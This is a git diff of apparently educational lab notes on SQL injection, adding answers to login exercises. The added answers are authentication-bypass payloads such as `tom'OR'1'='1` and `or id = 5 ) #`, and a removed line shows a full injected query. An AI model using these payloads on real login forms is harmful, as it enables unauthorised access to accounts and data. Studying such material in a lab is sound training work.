@@ -4,13 +4,13 @@
 
 ## Databases
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
@@ -76,15 +76,25 @@
 
 **Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**
 
-`SELECT * FROM logins WHERE (username=' or id = 5) #' AND id > 1) AND password="d41d8cd98f00b204e9800998ecf8427e";`
+UN: `tom'OR'1'='1`
 
+PW: anything...
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ### Using Comments
 
+**Login as the user with the id 5 to get the flag.**
 
+UN: `or id = 5 ) #`
+
+PW: anything...
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Union Clause
+
+
 
 ### Union Injection
 
